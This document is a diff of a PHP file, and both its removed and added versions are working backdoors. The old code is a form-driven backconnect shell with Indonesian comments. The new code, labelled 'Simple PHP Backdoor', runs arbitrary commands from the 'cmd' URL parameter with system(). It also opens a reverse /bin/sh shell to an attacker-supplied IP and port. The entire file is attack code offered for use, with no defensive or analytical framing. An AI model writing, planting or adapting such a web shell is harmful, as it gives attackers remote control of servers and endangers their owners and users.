@@ -1,65 +1,41 @@
 <?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip']) && isset($_POST['port'])) {
-    $ip = $_POST['ip'];
-    $port = $_POST['port'];
+// Simple PHP Backdoor with Command Execution and Backconnect
 
-    // Membuka koneksi
-    $sock = fsockopen($ip, $port);
+if (isset($_GET['cmd'])) {
+    // Command execution
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+
+if (isset($_GET['connect'])) {
+    // Backconnect feature
+    $ip = $_GET['ip']; // IP Address for backconnect
+    $port = $_GET['port']; // Port for backconnect
+
+    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     if (!$sock) {
-        die("Koneksi balik gagal ke $ip:$port.");
+        echo "Failed to connect: $errstr ($errno)";
+        exit(1);
     }
 
-    // Menghubungkan shell ke socket
     $descriptorspec = array(
         0 => array("pipe", "r"), // STDIN
         1 => array("pipe", "w"), // STDOUT
         2 => array("pipe", "w")  // STDERR
     );
-    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
 
+    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
     if (is_resource($process)) {
-        stream_set_blocking($pipes[1], false);
-        stream_set_blocking($pipes[2], false);
         while (!feof($sock)) {
-            $data = fgets($sock);
-            if ($data) {
-                fwrite($pipes[0], $data);
-            }
-            $output = stream_get_contents($pipes[1]);
-            if ($output) {
-                fwrite($sock, $output);
-            }
-            $error = stream_get_contents($pipes[2]);
-            if ($error) {
-                fwrite($sock, $error);
-            }
+            fwrite($pipes[0], fread($sock, 2048));
+            fwrite($sock, fread($pipes[1], 2048));
         }
         fclose($pipes[0]);
         fclose($pipes[1]);
-        fclose($pipes[2]);
         proc_close($process);
     }
     fclose($sock);
-    die("Koneksi balik berhasil ke $ip:$port.");
+    exit;
 }
-
 ?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHP Backconnect</title>
-</head>
-<body>
-    <h1>PHP Backconnect Shell</h1>
-    <form method="POST">
-        <label for="ip">IP Address:</label><br>
-        <input type="text" id="ip" name="ip" placeholder="Masukkan IP Anda" required><br><br>
-        <label for="port">Port:</label><br>
-        <input type="number" id="port" name="port" placeholder="Masukkan Port Anda" required><br><br>
-        <button type="submit">Connect</button>
-    </form>
-</body>
-</html>
